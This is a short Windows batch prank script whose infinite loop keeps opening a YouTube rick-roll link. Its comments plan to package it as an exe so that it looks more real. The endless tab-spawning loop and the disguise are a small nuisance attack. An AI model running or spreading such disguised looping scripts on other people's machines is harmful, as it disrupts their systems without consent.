:: TODO:make it an exe to make it look more real

:: opens rick roll infnitely
:: can be stoped with task manager (kill terminal) or with a simple restart

for /l %%x in (1,0,2) do (
   start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ" ""
)
